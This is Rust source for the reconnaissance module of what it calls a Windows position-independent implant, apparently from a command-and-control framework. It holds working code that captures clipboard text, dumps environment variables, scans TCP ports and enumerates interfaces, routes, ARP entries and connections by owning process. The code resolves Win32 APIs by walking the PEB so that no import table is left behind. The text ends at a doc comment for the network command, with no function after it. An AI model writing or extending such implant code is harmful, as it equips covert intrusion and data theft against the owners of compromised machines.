//! Recon command implementations for the Windows PIC implant.
//!
//! Position-independent, `#![no_std]` versions of the dev agent's recon commands
//! (`do_driveinfo` / `do_env` / `do_clipboard` / `do_portscan` / `do_net`).
//! Each function resolves the Win32 APIs it needs via the PEB-walk export
//! resolver ([`crate::resolve::export_addr`]) — never through an IAT — and
//! returns a [`nyx_protocol::Response`].
//!
//! DLLs that are NOT loaded by default (`user32.dll`, `ws2_32.dll`,
//! `iphlpapi.dll`) are force-loaded first via the same `LoadLibraryA`-from-
//! kernel32 trick used by [`crate::transport`] (transport.rs:47-64). Windows
//! refcounts module loads, so calling `LoadLibraryA` repeatedly is idempotent.
//!
//! All Win32 function pointers use the x64 `"system"` ABI and are transmuted
//! from the raw `usize` addresses the resolver returns. UTF-16 → UTF-8 is done
//! by a hand-rolled helper (no `alloc::string::ToString` for slices in no_std).

#![cfg(target_os = "windows")]

use crate::heap::{vec, String, Vec};
use crate::resolve::export_addr;
use core::ffi::c_void;
use nyx_protocol::Response;

// ---- Win32 constants -------------------------------------------------------

/// `AF_INET`.
const AF_INET: i32 = 2;
/// `SOCK_STREAM`.
const SOCK_STREAM: i32 = 1;
/// `ioctlsocket` command putting a socket into non-blocking mode. The raw value
/// is > i32::MAX, so it is materialised from the u32 bit pattern.
const FIONBIO: i32 = 0x8004_667Eu32 as i32;
/// `SOL_SOCKET` for `getsockopt`.
const SOL_SOCKET: i32 = 0xFFFF;
/// `SO_ERROR` for `getsockopt` (confirms a non-blocking connect succeeded).
const SO_ERROR: i32 = 0x1007;
/// `INVALID_SOCKET` on x64 ((SOCKET)~0).
const INVALID_SOCKET: usize = usize::MAX;
/// `INADDR_NONE` returned by `inet_addr` on a malformed address.
const INADDR_NONE: u32 = 0xFFFF_FFFF;
/// `CF_UNICODETEXT`.
const CF_UNICODETEXT: u32 = 13;
/// `CF_TEXT` (ANSI clipboard format).
const CF_TEXT: u32 = 1;
/// `GetExtendedTcpTable` flags for the IPv4 owner-PID table.
const TCP_TABLE_OWNER_PID_ALL: u32 = 5;

// ---- Shared helpers --------------------------------------------------------

/// Force-load a DLL via the PEB-resolved `LoadLibraryA` (mirrors
/// transport.rs:47-64). Idempotent: Windows refcounts module loads, so this is
/// safe to call on every recon invocation without a cached AtomicBool.
///
/// Returns `true` if the module is now mapped (or was already).
fn force_load(dll: &[u8]) -> bool {
    type LoadLibraryA = unsafe extern "system" fn(*const u8) -> *mut c_void;
    let addr = match unsafe { export_addr(b"kernel32.dll", b"LoadLibraryA") } {
        Some(a) => a,
        None => return false,
    };
    // Build a NUL-terminated ASCII name on the stack (dll names here are short).
    let mut name = [0u8; 32];
    let n = dll.len().min(name.len() - 1);
    name[..n].copy_from_slice(&dll[..n]);
    let load: LoadLibraryA = unsafe { core::mem::transmute(addr) };
    // SAFETY: `name` is a valid NUL-terminated C string on the stack.
    let h = unsafe { load(name.as_ptr()) };
    !h.is_null()
}

/// ASCII byte string → UTF-16 buffer, NUL-terminated (for Win32 `-W` APIs).
/// Only the low byte of each char is used, which is correct for the ASCII
/// names/hosts we pass (env var names, IPv4 dotted-quad, drive roots).
fn to_utf16(s: &[u8]) -> Vec<u16> {
    let mut v = Vec::with_capacity(s.len() + 1);
    for &b in s {
        v.push(b as u16);
    }
    v.push(0);
    v
}

/// Hand-rolled UTF-16 → UTF-8 (lossy, no surrogate-pair handling). ASCII fast
/// path (< 0x80) covers the overwhelming majority of env vars, drive letters,
/// hostnames and IP literals; BMP codepoints get their correct 2/3-byte UTF-8.
/// `alloc::string::ToString` is unavailable for slices in no_std, hence manual.
fn utf16_to_utf8_lossy(wide: &[u16]) -> Vec<u8> {
    let mut out = Vec::with_capacity(wide.len());
    for &w in wide {
        let w = w as u32;
        if w < 0x80 {
            out.push(w as u8);
        } else if w < 0x800 {
            out.push(0xC0 | (w >> 6) as u8);
            out.push(0x80 | (w & 0x3F) as u8);
        } else {
            // Basic BMP 3-byte encoding. Surrogate pairs are not decoded —
            // fine for env/clipboard/recon text which is effectively BMP.
            out.push(0xE0 | (w >> 12) as u8);
            out.push(0x80 | ((w >> 6) & 0x3F) as u8);
            out.push(0x80 | (w & 0x3F) as u8);
        }
    }
    out
}

/// Append a byte slice to the output buffer (no-std friendly `extend`).
fn push_str(out: &mut Vec<u8>, s: &[u8]) {
    out.extend_from_slice(s);
}

/// Append a `u64` in decimal (no `format!`/`to_string` in no_std).
fn push_u64(out: &mut Vec<u8>, mut v: u64) {
    if v == 0 {
        out.push(b'0');
        return;
    }
    let mut buf = [0u8; 20];
    let mut i = buf.len();
    while v != 0 {
        i -= 1;
        buf[i] = b'0' + (v % 10) as u8;
        v /= 10;
    }
    out.extend_from_slice(&buf[i..]);
}

/// Append an IPv4 address stored as a network-order DWORD (Win32 layout).
/// `addr.to_le_bytes()` yields the four octets in dotted order because the host
/// is little-endian and the DWORD is stored network-order in memory.
fn push_ipv4(out: &mut Vec<u8>, addr: u32) {
    let b = addr.to_le_bytes();
    push_u64(out, b[0] as u64);
    out.push(b'.');
    push_u64(out, b[1] as u64);
    out.push(b'.');
    push_u64(out, b[2] as u64);
    out.push(b'.');
    push_u64(out, b[3] as u64);
}

/// Append a byte as two lowercase hex digits.
fn push_hex(out: &mut Vec<u8>, b: u8) {
    const HEX: &[u8; 16] = b"0123456789abcdef";
    out.push(HEX[(b >> 4) as usize]);
    out.push(HEX[(b & 0x0F) as usize]);
}

/// Bounds-checked little-endian u32 read out of a raw byte buffer.
fn read_u32_le(buf: &[u8], off: usize) -> Option<u32> {
    if off.checked_add(4)? <= buf.len() {
        Some(u32::from_le_bytes([
            buf[off],
            buf[off + 1],
            buf[off + 2],
            buf[off + 3],
        ]))
    } else {
        None
    }
}

// ---- do_driveinfo ----------------------------------------------------------

/// Disk usage per drive. Mirrors agent-dev `do_driveinfo` semantics but via
/// Win32: enumerate roots with `GetLogicalDriveStringsW`, then query each with
/// `GetDiskFreeSpaceExW`. Line format: `C:\ total=X free=Y avail=Z`.
pub fn do_driveinfo() -> Response {
    type GetLogicalDriveStringsW = unsafe extern "system" fn(u32, *mut u16) -> u32;
    type GetDiskFreeSpaceExW =
        unsafe extern "system" fn(*const u16, *mut u64, *mut u64, *mut u64) -> i32;

    let glds: GetLogicalDriveStringsW =
        match unsafe { export_addr(b"kernel32.dll", b"GetLogicalDriveStringsW") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return Response::Err("driveinfo: GetLogicalDriveStringsW unresolved".into()),
        };
    let gdfs: GetDiskFreeSpaceExW =
        match unsafe { export_addr(b"kernel32.dll", b"GetDiskFreeSpaceExW") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return Response::Err("driveinfo: GetDiskFreeSpaceExW unresolved".into()),
        };

    const BUFW: usize = 260;
    let mut buf = vec![0u16; BUFW];
    // Fills buf with "C:\\\0D:\\\0...\0\0" (UTF-16). Returns chars copied,
    // excluding the final terminator (intermediate NULs ARE counted).
    let n = unsafe { glds(BUFW as u32, buf.as_mut_ptr()) };
    if n == 0 {
        return Response::Output(Vec::new());
    }
    let n = (n as usize).min(BUFW);

    let mut out: Vec<u8> = Vec::new();
    let mut i = 0;
    while i < n {
        // Find the end of this NUL-terminated root string.
        let start = i;
        while i < n && buf[i] != 0 {
            i += 1;
        }
        if start == i {
            break; // empty entry == end-of-list marker
        }
        let root = &buf[start..i];
        // GetDiskFreeSpaceExW needs a NUL-terminated root; rebuild a tiny buf.
        let mut root16 = Vec::with_capacity(root.len() + 1);
        root16.extend_from_slice(root);
        root16.push(0);

        let mut avail: u64 = 0;
        let mut total: u64 = 0;
        let mut free: u64 = 0;
        let ok = unsafe { gdfs(root16.as_ptr(), &mut avail, &mut total, &mut free) };

        push_str(&mut out, &utf16_to_utf8_lossy(root));
        if ok != 0 {
            push_str(&mut out, b" total=");
            push_u64(&mut out, total);
            push_str(&mut out, b" free=");
            push_u64(&mut out, free);
            push_str(&mut out, b" avail=");
            push_u64(&mut out, avail);
            push_str(&mut out, b"\n");
        } else {
            // e.g. empty CD-ROM tray; report it instead of silently skipping.
            push_str(&mut out, b" <unavailable>\n");
        }
        i += 1; // skip the separating NUL
    }
    Response::Output(out)
}

// ---- do_env ----------------------------------------------------------------

/// Environment variable collection. `name` empty ⇒ dump all (via
/// `GetEnvironmentStringsW`); otherwise fetch a single var (via
/// `GetEnvironmentVariableW`). Matches agent-dev `do_env` semantics.
pub fn do_env(name: &str) -> Response {
    if name.is_empty() {
        type GetEnvStringsW = unsafe extern "system" fn() -> *mut u16;
        type FreeEnvStringsW = unsafe extern "system" fn(*mut u16) -> i32;

        let ges: GetEnvStringsW =
            match unsafe { export_addr(b"kernel32.dll", b"GetEnvironmentStringsW") } {
                Some(a) => unsafe { core::mem::transmute(a) },
                None => return Response::Err("env: GetEnvironmentStringsW unresolved".into()),
            };
        let fes: FreeEnvStringsW =
            match unsafe { export_addr(b"kernel32.dll", b"FreeEnvironmentStringsW") } {
                Some(a) => unsafe { core::mem::transmute(a) },
                None => return Response::Err("env: FreeEnvironmentStringsW unresolved".into()),
            };

        let block = unsafe { ges() };
        if block.is_null() {
            return Response::Output(Vec::new());
        }
        let mut out: Vec<u8> = Vec::new();
        unsafe {
            let mut p = block;
            loop {
                // Measure this entry up to its NUL.
                let mut len = 0usize;
                while *p.add(len) != 0 {
                    len += 1;
                }
                if len == 0 {
                    break; // terminating empty entry ends the block
                }
                let entry = core::slice::from_raw_parts(p, len);
                let bytes = utf16_to_utf8_lossy(entry);
                // Win32 prefixes undocumented vars with '=' (e.g. "=ExitCode");
                // skip those — they aren't real environment variables.
                if !bytes.starts_with(b"=") {
                    out.extend_from_slice(&bytes);
                    out.push(b'\n');
                }
                p = p.add(len + 1); // advance past this entry + its NUL
            }
            let _ = fes(block); // always free, even on early break
        }
        Response::Output(out)
    } else {
        type GetEnvVarW = unsafe extern "system" fn(*const u16, *mut u16, u32) -> u32;
        let gev: GetEnvVarW =
            match unsafe { export_addr(b"kernel32.dll", b"GetEnvironmentVariableW") } {
                Some(a) => unsafe { core::mem::transmute(a) },
                None => return Response::Err("env: GetEnvironmentVariableW unresolved".into()),
            };

        let name16 = to_utf16(name.as_bytes());
        // 32767 is the documented max env-var length in chars; avoids the
        // truncation that a 260-wide buffer would cause on long PATH values.
        const BUFW: usize = 32767;
        let mut buf = vec![0u16; BUFW];
        // Returns chars copied (excl. NUL). 0 ⇒ not found (or empty value).
        let n = unsafe { gev(name16.as_ptr(), buf.as_mut_ptr(), BUFW as u32) };
        if n == 0 {
            // Note: a genuinely empty-valued var also yields 0 here; we treat
            // both as "not set" for simplicity (matching the dev agent).
            return Response::Err({
                let mut e = String::new();
                e.push_str("env: ");
                e.push_str(name);
                e.push_str(" not set");
                e
            });
        }
        let n = (n as usize).min(BUFW);
        let mut out: Vec<u8> = Vec::new();
        out.extend_from_slice(name.as_bytes());
        out.push(b'=');
        out.extend_from_slice(&utf16_to_utf8_lossy(&buf[..n]));
        out.push(b'\n');
        Response::Output(out)
    }
}

// ---- do_clipboard ----------------------------------------------------------

/// Clipboard text. Force-loads user32, opens the clipboard and returns text as
/// UTF-8 bytes. Prefers `CF_UNICODETEXT`; falls back to `CF_TEXT` (ANSI).
pub fn do_clipboard() -> Response {
    if !force_load(b"user32.dll") {
        return Response::Err("clipboard: user32.dll load failed".into());
    }
    type OpenClipboard = unsafe extern "system" fn(*mut c_void) -> i32;
    type CloseClipboard = unsafe extern "system" fn() -> i32;
    type GetClipboardData = unsafe extern "system" fn(u32) -> *mut c_void;
    type IsClipboardFormatAvailable = unsafe extern "system" fn(u32) -> i32;
    type GlobalLock = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
    type GlobalUnlock = unsafe extern "system" fn(*mut c_void) -> i32;

    let open: OpenClipboard = match unsafe { export_addr(b"user32.dll", b"OpenClipboard") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Response::Err("clipboard: OpenClipboard unresolved".into()),
    };
    let close: CloseClipboard = match unsafe { export_addr(b"user32.dll", b"CloseClipboard") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Response::Err("clipboard: CloseClipboard unresolved".into()),
    };
    let getdata: GetClipboardData = match unsafe { export_addr(b"user32.dll", b"GetClipboardData") }
    {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Response::Err("clipboard: GetClipboardData unresolved".into()),
    };
    let isavail: IsClipboardFormatAvailable = match unsafe {
        export_addr(b"user32.dll", b"IsClipboardFormatAvailable")
    } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Response::Err("clipboard: IsClipboardFormatAvailable unresolved".into()),
    };
    let glock: GlobalLock = match unsafe { export_addr(b"kernel32.dll", b"GlobalLock") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Response::Err("clipboard: GlobalLock unresolved".into()),
    };
    let gunlock: GlobalUnlock = match unsafe { export_addr(b"kernel32.dll", b"GlobalUnlock") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Response::Err("clipboard: GlobalUnlock unresolved".into()),
    };

    if unsafe { open(core::ptr::null_mut()) } == 0 {
        return Response::Err("clipboard: OpenClipboard failed".into());
    }

    // Pick the richest available text format.
    let (fmt, unicode) = if unsafe { isavail(CF_UNICODETEXT) } != 0 {
        (CF_UNICODETEXT, true)
    } else if unsafe { isavail(CF_TEXT) } != 0 {
        (CF_TEXT, false)
    } else {
        // No text on the clipboard — empty output, not an error.
        unsafe { close() };
        return Response::Output(Vec::new());
    };

    let mut out: Vec<u8> = Vec::new();
    let h = unsafe { getdata(fmt) };
    if !h.is_null() {
        let p = unsafe { glock(h) };
        if !p.is_null() {
            if unicode {
                // Count UTF-16 units up to the NUL terminator, then convert.
                let mut len = 0usize;
                unsafe {
                    let w = p as *const u16;
                    while *w.add(len) != 0 {
                        len += 1;
                    }
                    let wide = core::slice::from_raw_parts(w, len);
                    out = utf16_to_utf8_lossy(wide);
                }
            } else {
                // CF_TEXT is ANSI bytes; pass through verbatim (ASCII fast path).
                unsafe {
                    let b = p as *const u8;
                    let mut len = 0usize;
                    while *b.add(len) != 0 {
                        len += 1;
                    }
                    out.extend_from_slice(core::slice::from_raw_parts(b, len));
                }
            }
            unsafe { gunlock(h) };
        }
    }
    unsafe { close() };
    Response::Output(out)
}

// ---- do_portscan -----------------------------------------------------------

/// Parse a port spec ("22,80,443" or "1-1000") into a sorted, deduplicated
/// `Vec<u16>`. Verbatim port of agent-dev's `parse_ports` (lib.rs:317-334).
fn parse_ports(spec: &str) -> Vec<u16> {
    let mut out: Vec<u16> = Vec::new();
    for part in spec.split(',') {
        let part = part.trim();
        if let Some((lo, hi)) = part.split_once('-') {
            if let (Ok(lo), Ok(hi)) = (lo.trim().parse::<u16>(), hi.trim().parse::<u16>()) {
                for p in lo..=hi {
                    out.push(p);
                }
            }
        } else if let Ok(p) = part.parse::<u16>() {
            out.push(p);
        }
    }
    out.sort();
    out.dedup();
    out
}

/// `sockaddr_in` for IPv4 TCP connect.
#[repr(C)]
#[derive(Clone, Copy)]
struct SockAddrIn {
    sin_family: u16,
    sin_port: u16, // network byte order
    sin_addr: u32, // network byte order (from inet_addr)
    sin_zero: [u8; 8],
}

/// Winsock `fd_set` (64 SOCKET slots).
#[repr(C)]
#[derive(Clone, Copy)]
struct FdSet {
    fd_count: u32,
    fd_array: [usize; 64],
}

/// Winsock `timeval` (`long` is 32-bit on win64, so both fields are i32).
#[repr(C)]
#[derive(Clone, Copy)]
struct Timeval {
    tv_sec: i32,
    tv_usec: i32,
}

/// Resolved winsock function pointers used by [`probe_one`].
struct WsaFns {
    socket: unsafe extern "system" fn(i32, i32, i32) -> usize,
    connect: unsafe extern "system" fn(usize, *const SockAddrIn, i32) -> i32,
    close: unsafe extern "system" fn(usize) -> i32,
    ioctl: unsafe extern "system" fn(usize, i32, *mut u32) -> i32,
    select: unsafe extern "system" fn(
        i32,
        *const FdSet,
        *const FdSet,
        *const FdSet,
        *const Timeval,
    ) -> i32,
    getsockopt: unsafe extern "system" fn(usize, i32, i32, *mut u8, *mut i32) -> i32,
}

/// Probe one TCP port with a 2-second deadline. Sets the socket non-blocking,
/// issues a connect (returns WSAEWOULDBLOCK immediately), then polls `select`
/// on the write set and confirms success via `SO_ERROR`.
fn probe_one(f: &WsaFns, addr: u32, port: u16) -> bool {
    let s = unsafe { (f.socket)(AF_INET, SOCK_STREAM, 0) };
    if s == INVALID_SOCKET {
        return false;
    }
    // Non-blocking mode so connect() returns immediately.
    let mut mode: u32 = 1;
    let _ = unsafe { (f.ioctl)(s, FIONBIO, &mut mode) };

    let sa = SockAddrIn {
        sin_family: AF_INET as u16,
        sin_port: port.swap_bytes(), // host -> network order
        sin_addr: addr,              // already network order from inet_addr
        sin_zero: [0; 8],
    };
    // Expected to return -1 (WSAEWOULDBLOCK); ignore the return value.
    let _ = unsafe { (f.connect)(s, &sa, 16) };

    let mut fdarr = [0usize; 64];
    fdarr[0] = s;
    let wfds = FdSet {
        fd_count: 1,
        fd_array: fdarr,
    };
    // 250 ms per port — keeps total scan time bounded and avoids long beacon
    // blackouts. The original 2 s × N-ports would stall check-ins for minutes
    // on filtered hosts.
    let tv = Timeval {
        tv_sec: 0,
        tv_usec: 250_000,
    };
    let n = unsafe { (f.select)(0, core::ptr::null(), &wfds, core::ptr::null(), &tv) };

    let mut open = false;
    if n > 0 {
        // Writable ⇒ either connected or errored; SO_ERROR disambiguates.
        let mut err: i32 = 0;
        let mut errlen: i32 = 4;
        let r = unsafe {
            (f.getsockopt)(
                s,
                SOL_SOCKET,
                SO_ERROR,
                &mut err as *mut i32 as *mut u8,
                &mut errlen,
            )
        };
        if r == 0 && err == 0 {
            open = true;
        }
    }
    unsafe { (f.close)(s) };
    open
}

/// TCP port scan. Mirrors agent-dev `do_portscan`: parse the spec, probe each
/// port, return "PORT open/closed" lines joined by `\n`. Uses winsock with a
/// non-blocking connect + `select` for the per-port 2s deadline.
pub fn do_portscan(host: &str, ports: &str) -> Response {
    let targets = parse_ports(ports);
    if targets.is_empty() {
        return Response::Err("portscan: no valid ports specified".into());
    }
    if !force_load(b"ws2_32.dll") {
        return Response::Err("portscan: ws2_32.dll load failed".into());
    }

    type WSAStartup = unsafe extern "system" fn(u16, *mut u8) -> i32;
    type ConnectFn = unsafe extern "system" fn(usize, *const SockAddrIn, i32) -> i32;
    type CloseSocket = unsafe extern "system" fn(usize) -> i32;
    type IoctlSocket = unsafe extern "system" fn(usize, i32, *mut u32) -> i32;
    type SelectFn = unsafe extern "system" fn(
        i32,
        *const FdSet,
        *const FdSet,
        *const FdSet,
        *const Timeval,
    ) -> i32;
    type InetAddr = unsafe extern "system" fn(*const u8) -> u32;
    type WSACleanup = unsafe extern "system" fn() -> i32;
    type GetSockOpt = unsafe extern "system" fn(usize, i32, i32, *mut u8, *mut i32) -> i32;

    let startup: WSAStartup = match unsafe { export_addr(b"ws2_32.dll", b"WSAStartup") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Response::Err("portscan: WSAStartup unresolved".into()),
    };
    let cleanup: WSACleanup = match unsafe { export_addr(b"ws2_32.dll", b"WSACleanup") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Response::Err("portscan: WSACleanup unresolved".into()),
    };
    let inet_addr: InetAddr = match unsafe { export_addr(b"ws2_32.dll", b"inet_addr") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Response::Err("portscan: inet_addr unresolved".into()),
    };
    let fns = WsaFns {
        socket: match unsafe { export_addr(b"ws2_32.dll", b"socket") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return Response::Err("portscan: socket unresolved".into()),
        },
        connect: match unsafe { export_addr(b"ws2_32.dll", b"connect") } {
            Some(a) => unsafe { core::mem::transmute::<_, ConnectFn>(a) },
            None => return Response::Err("portscan: connect unresolved".into()),
        },
        close: match unsafe { export_addr(b"ws2_32.dll", b"closesocket") } {
            Some(a) => unsafe { core::mem::transmute::<_, CloseSocket>(a) },
            None => return Response::Err("portscan: closesocket unresolved".into()),
        },
        ioctl: match unsafe { export_addr(b"ws2_32.dll", b"ioctlsocket") } {
            Some(a) => unsafe { core::mem::transmute::<_, IoctlSocket>(a) },
            None => return Response::Err("portscan: ioctlsocket unresolved".into()),
        },
        select: match unsafe { export_addr(b"ws2_32.dll", b"select") } {
            Some(a) => unsafe { core::mem::transmute::<_, SelectFn>(a) },
            None => return Response::Err("portscan: select unresolved".into()),
        },
        getsockopt: match unsafe { export_addr(b"ws2_32.dll", b"getsockopt") } {
            Some(a) => unsafe { core::mem::transmute::<_, GetSockOpt>(a) },
            None => return Response::Err("portscan: getsockopt unresolved".into()),
        },
    };

    // Resolve the target IPv4 (NUL-terminated for inet_addr).
    let mut hostz = [0u8; 256];
    let hn = host.as_bytes().len().min(hostz.len() - 1);
    hostz[..hn].copy_from_slice(&host.as_bytes()[..hn]);
    let addr = unsafe { inet_addr(hostz.as_ptr()) };
    if addr == INADDR_NONE {
        return Response::Err("portscan: invalid IPv4 address".into());
    }

    // WSAData is 404 bytes on x64; a zeroed byte buffer is simpler & safe for
    // STARTUP-only use (we never read fields back out of it).
    let mut wsadata = [0u8; 404];
    if unsafe { startup(0x0202, wsadata.as_mut_ptr()) } != 0 {
        // 0x0202 == request winsock 2.2.
        return Response::Err("portscan: WSAStartup failed".into());
    }

    let mut out: Vec<u8> = Vec::new();
    for &port in &targets {
        let open = probe_one(&fns, addr, port);
        push_u64(&mut out, port as u64);
        push_str(&mut out, if open { b" open\n" } else { b" closed\n" });
    }
    unsafe { cleanup() };
    Response::Output(out)
}

// ---- do_net ----------------------------------------------------------------

/// Signature shared by `GetIpAddrTable` / `GetIpForwardTable` / `GetIpNetTable`.
type IpTableFn = unsafe extern "system" fn(*mut u8, *mut u32, i32) -> u32;

/// Two-step "query size, allocate, fill" helper for the `IpTableFn` tables.
/// Caps the allocation at 1 MiB as defense-in-depth against a bogus size.
unsafe fn fill_table(f: IpTableFn) -> Option<Vec<u8>> {
    let mut size: u32 = 0;
    let _ = f(core::ptr::null_mut(), &mut size, 0);
    if size == 0 || (size as usize) > (1 << 20) {
        return None;
    }
    let mut buf = vec![0u8; size as usize];
    let rc = f(buf.as_mut_ptr(), &mut size, 0);
    if rc != 0 {
        return None;
    }
    Some(buf)
}

/// `MIB_IPADDRROW`-style interface table query.
fn net_interfaces() -> Response {
    let f: IpTableFn = match unsafe { export_addr(b"iphlpapi.dll", b"GetIpAddrTable") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Response::Err("net interfaces: GetIpAddrTable unresolved".into()),
    };
    let buf = match unsafe { fill_table(f) } {
        Some(b) => b,
        None => return Response::Err("net interfaces: GetIpAddrTable failed".into()),
    };
    // Layout: [u32 count][MIB_IPADDRROW x N]; each row 24 bytes
    // (addr, index, mask, bcast, reasm, unused2x2).
    const ROW: usize = 24;
    let n = read_u32_le(&buf, 0).unwrap_or(0) as usize;
    let mut out: Vec<u8> = Vec::new();
    let mut i = 0;
    while i < n {
        let off = 4 + i * ROW;
        if off + ROW > buf.len() {
            break;
        }
        let addr = read_u32_le(&buf, off).unwrap_or(0);
        let idx = read_u32_le(&buf, off + 4).unwrap_or(0);
        let mask = read_u32_le(&buf, off + 8).unwrap_or(0);
        push_str(&mut out, b"ifindex=");
        push_u64(&mut out, idx as u64);
        push_str(&mut out, b" addr=");
        push_ipv4(&mut out, addr);
        push_str(&mut out, b" mask=");
        push_ipv4(&mut out, mask);
        push_str(&mut out, b"\n");
        i += 1;
    }
    Response::Output(out)
}

/// `MIB_IPFORWARDROW`-style routing table query.
fn net_routes() -> Response {
    let f: IpTableFn = match unsafe { export_addr(b"iphlpapi.dll", b"GetIpForwardTable") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Response::Err("net routes: GetIpForwardTable unresolved".into()),
    };
    let buf = match unsafe { fill_table(f) } {
        Some(b) => b,
        None => return Response::Err("net routes: GetIpForwardTable failed".into()),
    };
    // MIB_IPFORWARDROW is 56 bytes; we read dest(0), mask(4), nexthop(12),
    // ifindex(16).
    const ROW: usize = 56;
    let n = read_u32_le(&buf, 0).unwrap_or(0) as usize;
    let mut out: Vec<u8> = Vec::new();
    let mut i = 0;
    while i < n {
        let off = 4 + i * ROW;
        if off + ROW > buf.len() {
            break;
        }
        let dest = read_u32_le(&buf, off).unwrap_or(0);
        let mask = read_u32_le(&buf, off + 4).unwrap_or(0);
        let gw = read_u32_le(&buf, off + 12).unwrap_or(0);
        let ifi = read_u32_le(&buf, off + 16).unwrap_or(0);
        push_str(&mut out, b"dst=");
        push_ipv4(&mut out, dest);
        push_str(&mut out, b" mask=");
        push_ipv4(&mut out, mask);
        push_str(&mut out, b" gw=");
        push_ipv4(&mut out, gw);
        push_str(&mut out, b" ifindex=");
        push_u64(&mut out, ifi as u64);
        push_str(&mut out, b"\n");
        i += 1;
    }
    Response::Output(out)
}

/// `MIB_IPNETROW`-style ARP table query.
fn net_arp() -> Response {
    let f: IpTableFn = match unsafe { export_addr(b"iphlpapi.dll", b"GetIpNetTable") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Response::Err("net arp: GetIpNetTable unresolved".into()),
    };
    let buf = match unsafe { fill_table(f) } {
        Some(b) => b,
        None => return Response::Err("net arp: GetIpNetTable failed".into()),
    };
    // MIB_IPNETROW is 24 bytes: index(0), physaddrlen(4), bphysaddr[8](8),
    // addr(16), type(20).
    const ROW: usize = 24;
    let n = read_u32_le(&buf, 0).unwrap_or(0) as usize;
    let mut out: Vec<u8> = Vec::new();
    let mut i = 0;
    while i < n {
        let off = 4 + i * ROW;
        if off + ROW > buf.len() {
            break;
        }
        let idx = read_u32_le(&buf, off).unwrap_or(0);
        let physlen = read_u32_le(&buf, off + 4).unwrap_or(0) as usize;
        let addr = read_u32_le(&buf, off + 16).unwrap_or(0);
        push_ipv4(&mut out, addr);
        push_str(&mut out, b" ");
        // Print up to 6 MAC octets (Ethernet).
        let mac_max = physlen.min(6);
        for m in 0..mac_max {
            if m > 0 {
                out.push(b':');
            }
            // 8 + m < ROW (=24), already bounds-checked by off+ROW guard above.
            push_hex(&mut out, buf[off + 8 + m]);
        }
        push_str(&mut out, b" ifindex=");
        push_u64(&mut out, idx as u64);
        push_str(&mut out, b"\n");
        i += 1;
    }
    Response::Output(out)
}

/// Append a human-readable TCP state name for `GetExtendedTcpTable` rows.
fn push_tcp_state(out: &mut Vec<u8>, s: u32) {
    let name: &[u8] = match s {
        1 => b"CLOSED",
        2 => b"LISTEN",
        3 => b"SYN_SENT",
        4 => b"SYN_RCVD",
        5 => b"ESTAB",
        6 => b"FIN_WAIT1",
        7 => b"FIN_WAIT2",
        8 => b"CLOSE_WAIT",
        9 => b"CLOSING",
        10 => b"LAST_ACK",
        11 => b"TIME_WAIT",
        12 => b"DELETE_TCB",
        _ => b"UNKNOWN",
    };
    out.extend_from_slice(name);
}

/// `MIB_TCPROW_OWNER_PID`-style connection table query via
/// `GetExtendedTcpTable` (IPv4 owner-PID variant).
fn net_connections() -> Response {
    type GetExtTcp = unsafe extern "system" fn(*mut u8, *mut u32, i32, u32, u32, u32) -> u32;
    let f: GetExtTcp = match unsafe { export_addr(b"iphlpapi.dll", b"GetExtendedTcpTable") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Response::Err("net connections: GetExtendedTcpTable unresolved".into()),
    };

    // Size query: AF_INET=2, TCP_TABLE_OWNER_PID_ALL=5, Reserved=0.
    let mut size: u32 = 0;
    let _ = unsafe {
        f(
            core::ptr::null_mut(),
            &mut size,
            0,
            AF_INET as u32,
            TCP_TABLE_OWNER_PID_ALL,
            0,
        )
    };
    if size == 0 || (size as usize) > (1 << 20) {
        return Response::Output(Vec::new());
    }
    let mut buf = vec![0u8; size as usize];
    let rc = unsafe {
        f(
            buf.as_mut_ptr(),
            &mut size,
            0,
            AF_INET as u32,
            TCP_TABLE_OWNER_PID_ALL,
            0,
        )
    };
    if rc != 0 {
        return Response::Err("net connections: GetExtendedTcpTable failed".into());
    }

    // MIB_TCPROW_OWNER_PID: 24 bytes (state, laddr, lport, raddr, rport, pid).
    const ROW: usize = 24;
    let n = read_u32_le(&buf, 0).unwrap_or(0) as usize;
    let mut out: Vec<u8> = Vec::new();
    let mut i = 0;
    while i < n {
        let off = 4 + i * ROW;
        if off + ROW > buf.len() {
            break;
        }
        let state = read_u32_le(&buf, off).unwrap_or(0);
        let laddr = read_u32_le(&buf, off + 4).unwrap_or(0);
        let lport_raw = read_u32_le(&buf, off + 8).unwrap_or(0);
        let raddr = read_u32_le(&buf, off + 12).unwrap_or(0);
        let rport_raw = read_u32_le(&buf, off + 16).unwrap_or(0);
        let pid = read_u32_le(&buf, off + 20).unwrap_or(0);
        // Ports stored network-order in the low 16 bits.
        let lport = ((lport_raw & 0xFFFF) as u16).swap_bytes();
        let rport = ((rport_raw & 0xFFFF) as u16).swap_bytes();

        push_tcp_state(&mut out, state);
        push_str(&mut out, b" ");
        push_ipv4(&mut out, laddr);
        out.push(b':');
        push_u64(&mut out, lport as u64);
        push_str(&mut out, b" -> ");
        push_ipv4(&mut out, raddr);
        out.push(b':');
        push_u64(&mut out, rport as u64);
        push_str(&mut out, b" pid=");
        push_u64(&mut out, pid as u64);
        push_str(&mut out, b"\n");
        i += 1;
    }
    Response::Output(out)
}

/// Network recon. Routes the `query` exactly like agent-dev `do_net`, but the
/// PIC implant has no shell to fall back to — unknown queries error out.
/// - `"interfaces"` / `"ifconfig"` / `""` → `GetIpAddrTable`
/// - `"routes"` / `"route"` / `"netstat"` → `GetIpForwardTable`
/// - `"arp"` → `GetIpNetTable`
/// - `"connections"` / `"conn"` → `GetExtendedTcpTable`
/// - other → `Response::Err("net <query>: unknown query type")`
